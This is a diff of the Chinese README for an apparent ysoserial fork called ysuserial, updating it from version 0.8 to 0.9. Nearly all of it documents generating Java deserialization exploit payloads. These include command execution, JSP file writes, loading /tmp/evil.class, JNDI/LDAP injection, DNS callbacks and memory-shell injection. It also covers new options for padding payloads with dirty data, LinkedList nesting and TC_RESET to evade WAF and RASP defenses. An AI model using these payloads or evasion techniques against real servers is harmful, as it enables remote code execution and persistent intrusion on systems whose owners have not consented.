@@ -15,12 +15,12 @@ For English Speaker : [ReadMe_en.md](./ReadMe_en.md)
 6. 防御绕过：在部分系统中使用了 WAF/RASP 等防御模式，本项目去除大多数原版特征，并在执行恶意动作时使用了多种能够绕过 RASP 的执行方式，绕过防护；
 7. MSF/CS 上线：配合远程 Jar 包一键上线 MSF/CS 的功能，集成一体，快人一步；
 8. 使用去除编译类字节码行号、Javassist 动态添加父类、接口、重写方法等多种技术缩小反序列化 payload；
-9. 支持使用随机集合类封装反序列化恶意类并填充随机长度字符来绕过流量层解析的功能。
+9. 支持使用随机集合类封装反序列化恶意类并填充随机长度字符、循环嵌套 LinkedList、序列化数据中插入 TC_RESET 来绕过流量层解析的功能。
 
 项目支持利用链展示：
 
 ```text
-$ java -jar ysuserial-0.8-su18-all.jar
+$ java -jar ysuserial-0.9-su18-all.jar
             _.-^^---....,,--
        _--                  --_
       <                        >)
@@ -39,8 +39,8 @@ $ java -jar ysuserial-0.8-su18-all.jar
 [root]#~  AND OF COURSE TO THE All MIGHTY @frohoff
 [root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' [options]
 [root]#~  Available payload types:
-Aug 22, 2022 1:04:26 PM org.reflections.Reflections scan
-INFO: Reflections took 97 ms to scan 1 urls, producing 26 keys and 204 values
+Sep 06, 2022 11:49:53 AM org.reflections.Reflections scan
+INFO: Reflections took 97 ms to scan 1 urls, producing 26 keys and 205 values
      Payload                  Authors                                Dependencies
      -------                  -------                                ------------
      AspectJWeaver            @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
@@ -61,6 +61,7 @@ INFO: Reflections took 97 ms to scan 1 urls, producing 26 keys and 204 values
      CommonsBeanutils4                                               commons-beanutils:1.9.2, commons-collections:3.1
      CommonsCollections1      @frohoff                               commons-collections:3.1
      CommonsCollections10                                            commons-collections:3.2.1
+     CommonsCollections11
      CommonsCollections2      @frohoff                               commons-collections4:4.0
      CommonsCollections3      @frohoff                               commons-collections:3.1
      CommonsCollections4      @frohoff                               commons-collections4:4.0
@@ -99,18 +100,20 @@ INFO: Reflections took 97 ms to scan 1 urls, producing 26 keys and 204 values
      URLDNS                   @gebl
      Vaadin1                  @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
      Wicket1                  @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
-     
-     
-usage: ysoserial-[version]-su18-all.jar [-d <arg>] [-g <arg>] [-gz] [-i]
-       [-o] [-p <arg>]
- -d,--dirty <arg>        Using dirty data to bypass WAF
- -g,--gadget <arg>       Java deserialization gadget
- -i,--inherit            Make payload inherit AbstractTranslet or not
- -o,--obscure            Using reflection to bypass RASP
- -p,--parameters <arg>   Gadget parameters
 
 
-Recommended Usage: -g [payload] -p '[command]' -d 50000 -o -i
+usage: ysoserial-[version]-su18-all.jar [-dl <arg>] [-dt <arg>] [-g <arg>]
+       [-i] [-o] [-p <arg>] [-u <arg>]
+ -dl,--dirty-length <arg>   Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2
+ -dt,--dirty-type <arg>     Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data
+ -g,--gadget <arg>          Java deserialization gadget
+ -i,--inherit               Make payload inherit AbstractTranslet or not
+ -o,--obscure               Using reflection to bypass RASP
+ -p,--parameters <arg>      Gadget parameters
+ -u,--url <arg>             MemoryShell binding url pattern,default [/su18]
+
+
+Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i
 If you want your payload being extremely short，you could just use:
 java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 ```
@@ -146,7 +149,7 @@ ChainedTransformer 进行链式反射调用的利用方式，针对 CC 3.1-3.2.1
 **命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 ```
 
 效果图：
@@ -156,7 +159,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p PB-lin-b3BlbiAtYS
 **DNSLOG示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
 ```
 
 效果图：
@@ -166,7 +169,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'DL-xxx.org'
 **脚本引擎解析 JS 代码示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -176,7 +179,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'SE-b3BlbiAtYSBDY
 **文件写入示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PCVAcGFnZSBwYWdlR.....'
 ```
 
 效果图：
@@ -186,7 +189,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'WF-/tmp/1.jsp#PC
 **触发 JNDI 查询注入示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA=='
 ```
 
 效果图：
@@ -196,7 +199,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'JD-ldap://127.0.
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections1 -p 'open -a Calculator.app'
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'open -a Calculator.app'
 ```
 
 效果图：
@@ -274,7 +277,7 @@ Tomcat Listener NeoReg 流量隧道：
 示例：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
+java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.class
 ```
 
 效果图：
@@ -288,7 +291,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsCollections3 -p LF-/tmp/evil.clas
 **普通命令执行示例**：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
+java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator.app'
 ```
 
 效果图：
@@ -328,7 +331,7 @@ java -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils2 -p 'open -a Calculator
 示例：`all:xxxxxx.dns.log`
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
+java -jar ysuserial-0.9-su18-all.jar -g URLDNS -p 'all:xxxxxx.dns.log'
 ```
 
 效果图：
@@ -430,12 +433,12 @@ python neoreg.py -k su18 -u http://xxx.com/ -H 'Referer: https://su18.org/'
 在一些情况下，流量层的 WAF 会在对流量数据包解析时对关键字、关键特征进行匹配，例如反序列化流量包中出现的一些关键类的包名、类名，但是流量设备受限于性能影响，不会无限制的解析请求包，可能会影响到实际业务，因此一般会有解析的`时间`
 上或`长度`上的阈值，超过该阈值，将放弃检查。
 
-因此本项目添加了为反序列化数据添加脏数据用来绕过流量层面的 WAF 的功能，在生成反序列化数据时，指定 -d 参数，即可生成封装后的带有随机脏字符的反序列化数据包。
+因此本项目添加了为反序列化数据添加脏数据用来绕过流量层面的 WAF 的功能，在生成反序列化数据时，指定 -dt 参数，即可根据不同类型生成封装后的带有随机脏字符的反序列化数据包。
 
 例如：
 
 ```shell
-java -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -d 50000
+java -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils1 -p 'EX-MS-TEXMSFromThread' -dt 1 -dl 50000
 ```
 
 可以生成填充了 50000 个脏字符的序列化数据
@@ -502,5 +505,5 @@ RASP 产品完美防护，欢迎大家联系电话 010-61943626 或邮件 market
 如果编译项目拷贝到其他位置在使用时报错找不到某些依赖的情况，可以使用 `-Djava.ext.dirs` 参数指定依赖目录，例如：
 
 ```shell
-java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-0.8-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread"
+java -Djava.ext.dirs=/Users/su18/JavaProjects/ysoserial/lib -jar ysuserial-0.9-su18-all.jar -g CommonsBeanutils1 -p "EX-MS-TWSMSFromThread"
 ```
